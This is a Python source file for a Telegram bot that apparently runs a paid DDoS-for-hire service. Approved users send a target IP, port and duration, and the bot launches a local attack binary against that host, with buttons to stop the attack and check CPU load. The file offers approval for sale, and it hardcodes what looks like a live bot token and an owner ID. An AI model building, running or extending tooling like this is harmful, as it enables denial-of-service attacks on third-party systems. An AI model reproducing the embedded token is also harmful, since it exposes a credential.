import subprocess
import psutil
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Configuration
TOKEN = "7388685412:AAEmFyr7RLNdI-G3hlOFxG8aWEExJYdKf6Y"
OWNER_ID = "1221262658"

# Data Storage for Admins and Approved Users
approved_users = set()
admin_users = {OWNER_ID}  # Owner starts as an admin

# Store process reference for killing attacks
attack_process = None  

# Command: /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Welcome to cumback ddos! Use /help to see available commands."
    )

# Command: /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = """
Commands List:
/start - Welcome Message
/help - Command Usage Guide
/fuck <ip> <port> <time> - Start Attack
/add <userid> - Approve User (Admin Only)
/remove <userid> - Disapprove User
/broadcast <message> - Send Message to Approved Users (Admin Only)
/addadmin <userid> - Add Admin
/deladmin <userid> - Remove Admin
/owner - Show Bot Owner Info
"""
    await update.message.reply_text(help_text)

# Command: /kiss
async def kiss(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global attack_process  

    if str(update.message.from_user.id) not in approved_users:
        await update.message.reply_text("❌ Access denied! Get approval from the owner.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Correct Usage: /fuck <ip> <port> <time>")
        return

    ip, port, time = context.args

    # Start the attack process using `ipx`
    attack_process = subprocess.Popen(["./sun", ip, port, time, "1200" ])

    keyboard = [
        [InlineKeyboardButton("🔥 Hit", callback_data="hit")],
        [InlineKeyboardButton("🛑 Kill", callback_data="kill")],
        [InlineKeyboardButton("🖥️ CPU Usage", callback_data="cpu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_animation("https://media.giphy.com/media/l3vR85PnGsBwu1PFK/giphy.gif")
    await update.message.reply_text(
        f"🔥 Attack started on {ip}:{port} for {time} seconds!",
        reply_markup=reply_markup
    )

# Callback for Inline Keyboard
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global attack_process  

    query = update.callback_query
    await query.answer()

    if query.data == "hit":
        await query.message.reply_text("✅ Attack confirmed and working.")
    elif query.data == "kill":
        if attack_process:
            attack_process.terminate()
            attack_process = None
            await query.message.reply_text("🛑 Attack stopped successfully.")
        else:
            await query.message.reply_text("❌ No active attack found.")
    elif query.data == "cpu":
        cpu_usage = psutil.cpu_percent(interval=1)
        await query.message.reply_text(f"🖥️ Current CPU Usage: {cpu_usage}%")

# Command: /add
async def add(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) not in admin_users:
        await update.message.reply_text("❌ Admin access required!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Correct Usage: /add <userid>")
        return

    approved_users.add(context.args[0])
    await update.message.reply_text(f"✅ User {context.args[0]} added to the approved list.")

# Command: /remove
async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) not in admin_users:
        await update.message.reply_text("❌ Admin access required!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Correct Usage: /remove <userid>")
        return

    approved_users.discard(context.args[0])
    await update.message.reply_text(f"✅ User {context.args[0]} removed from the approved list.")

# Command: /broadcast
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) not in admin_users:
        await update.message.reply_text("❌ Admin access required!")
        return

    message = " ".join(context.args)
    if not message:
        await update.message.reply_text("❌ Correct Usage: /broadcast <message>")
        return

    for user in approved_users:
        try:
            await context.bot.send_message(chat_id=user, text=message)
        except Exception as e:
            print(f"Failed to send message to {user}: {e}")
    await update.message.reply_text("✅ Broadcast sent successfully.")

# Command: /addadmin
async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can add admins!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Correct Usage: /addadmin <userid>")
        return

    admin_users.add(context.args[0])
    await update.message.reply_text(f"✅ User {context.args[0]} is now an admin.")

# Command: /deladmin
async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can remove admins!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Correct Usage: /deladmin <userid>")
        return

    admin_users.discard(context.args[0])
    await update.message.reply_text(f"✅ User {context.args[0]} removed from the admin list.")

# Command: /owner
async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("👑 My Creative Owner is @iNSANE_010. SEND MESSAGE TO BUY APPROVAL")

# Main Function to Run the Bot
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("fuck", kiss))
    app.add_handler(CommandHandler("add", add))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("deladmin", deladmin))
    app.add_handler(CommandHandler("owner", owner))

    app.add_handler(CallbackQueryHandler(button_callback))

    print("🚀 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
